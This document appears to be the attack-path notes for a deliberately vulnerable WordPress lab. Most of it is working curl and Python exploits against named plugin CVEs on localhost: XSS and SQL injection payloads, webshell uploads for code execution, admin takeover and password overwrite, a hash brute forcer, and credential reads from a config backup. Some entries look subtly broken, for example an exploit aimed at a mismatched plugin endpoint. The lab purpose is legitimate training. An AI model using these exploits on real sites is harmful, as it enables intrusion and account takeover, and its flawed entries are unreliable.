# Attack paths — step-by-step

For each CVE in the lab we document **the smallest reproducible exploitation
path**. Curl/Python snippets only; no live attack toolkits.

> All examples target `http://localhost:31338`. Adapt the host if you remapped
> the port in `.env`.

## 1. CVE-2023-6961 — really-simple-ssl 7.0.5 stored XSS

```bash
curl -s "$BASE/wp-login.php" \
  -H 'X-Forwarded-For: <script>fetch("/wp-admin/")</script>'
# Visit /wp-admin/ as admin to fire the payload.
```

## 2. CVE-2024-28000 — litespeed-cache 6.3.0.1 privilege escalation

```bash
# The vulnerability is a brute-forceable security hash that maps to user_id=1.
python3 - <<'PY'
import requests, itertools, string
BASE = "http://localhost:31338"
for h in itertools.islice(("".join(c) for c in itertools.product(string.hexdigits.lower(), repeat=4)), 0, 65536):
    r = requests.get(f"{BASE}/?ls_role_simulation=admin&_ls_sec_hash="+h, allow_redirects=False)
    if r.cookies.get("wordpress_logged_in_*"):
        print("hit:", h); break
PY
```

## 3. CVE-2024-2194 — wp-statistics 13.2.10 time-based SQLi

```bash
TIME=$(curl -s -o /dev/null -w '%{time_total}' \
  "$BASE/?current_page_id=1)%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP(5)))a)--")
echo "delay = $TIME"
```

## 4. CVE-2024-28890 — forminator 1.24.6 unauth AFU -> RCE

```bash
# 1. Find a form id
FORM_ID=$(curl -s "$BASE/?p=2" | grep -oP 'forminator-module-\K\d+' | head -1)
# 2. POST a PHP upload as a form attachment field
curl -s -F "form_id=$FORM_ID" \
        -F "page_id=2" \
        -F "current_url=$BASE" \
        -F "upload-1[]=@shell.php;type=application/x-php" \
        "$BASE/wp-admin/admin-ajax.php?action=forminator_submit_form_custom-forms"
# 3. Shell path appears in /wp-content/uploads/forminator/<hash>/shell.php
```

## 5. CVE-2023-3460 — ultimate-member 2.6.6 PE to admin

```bash
curl -s "$BASE/wp-admin/admin-ajax.php" \
  -d 'action=um_resetpw' \
  -d 'um-form-id=1' \
  -d 'wp_capabilities=a:1:{s:13:"administrator";b:1;}' \
  -d 'user_login=hacker' \
  -d 'user_email=hacker@vuln.lab' \
  -d 'user_password=hacker' \
  -d 'user_password_confirm=hacker'
```

## 6. CVE-2024-1071 — email-subscribers 5.7.13 UNION SQLi

```bash
curl -s "$BASE/wp-json/contact-form-7/v1/contact-forms/0/feedback?hash=' UNION SELECT user_login,user_pass FROM wp_users-- -"
```

## 7. CVE-2023-32243 — essential-addons-for-elementor-lite 5.7.1 password reset

```bash
curl -s "$BASE/wp-admin/admin-ajax.php" \
  -d 'action=eael_password_reset' \
  -d 'page_id=2' \
  -d 'eael-resetpassword-nonce=' \
  -d 'rp_login=admin' \
  -d 'rp_key=' \
  -d 'eael-pass1=pwned' \
  -d 'eael-pass2=pwned'
```

## 8. CVE-2023-6063 — wp-fastest-cache 1.2.1 cookie SQLi

```bash
curl -s -H "Cookie: wordpress_logged_in_FAKE=admin') UNION SELECT 1,user_pass,3 FROM wp_users-- -" \
  "$BASE/?p=1"
```

## 9. CVE-2023-5360 — royal-elementor-addons 1.3.78 unauth AFU

```bash
curl -s -X POST "$BASE/wp-admin/admin-ajax.php" \
  -F "action=wpr_addons_upload_file" \
  -F "fields[0][type]=upload" \
  -F "fields[0][name]=file" \
  -F "uploaded_file[]=@shell.php;type=application/x-php"
```

## 10. CVE-2023-6000 — popup-builder 4.2.3 stored XSS

```bash
# Submit the contact form inside a popup, payload lands in admin dashboard.
curl -s "$BASE/?sgpb-id=1" -d 'name=<svg onload=alert(1)>'
```

## 11. CVE-2024-1207 — give 2.24.0 REST SQLi

```bash
curl -s "$BASE/wp-json/give-api/v2/donations/?orderby=id);UPDATE wp_users SET user_pass='\$P\$BlabFake' WHERE ID=1-- -"
```

## 12. CVE-2023-6875 — post-smtp 2.8.7 unauth API bypass

```bash
curl -s "$BASE/wp-json/post-smtp/v1/getLogs" -H "X-WP-Nonce: 0"
# Returns full log including admin password reset tokens.
```

## 13. CVE-2023-28121 — woocommerce 7.0.0 auth bypass

```bash
curl -s "$BASE/wp-json/wp/v2/users/me" \
  -H "X-WCPAY-PLATFORM-CHECKOUT-USER: 1"
```

## 14. CVE-2020-25213 — wp-file-manager 7.0 elFinder RCE

```bash
curl -s -X POST "$BASE/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php" \
  -F "cmd=upload" \
  -F "target=l1_Lw" \
  -F "upload[]=@shell.php"
```

## 15. Misconfig chain — git -> wp-config -> DB takeover

```bash
# 1. Dump .git
curl -s "$BASE/.git/config"
# 2. Find HEAD commit, replay objects
# 3. Read wp-config.php.bak directly:
curl -s "$BASE/wp-config.php.bak" | grep DB_PASSWORD
# 4. Connect:
mysql -h 127.0.0.1 -P 31306 -u wordpress -pwordpress wordpress
```
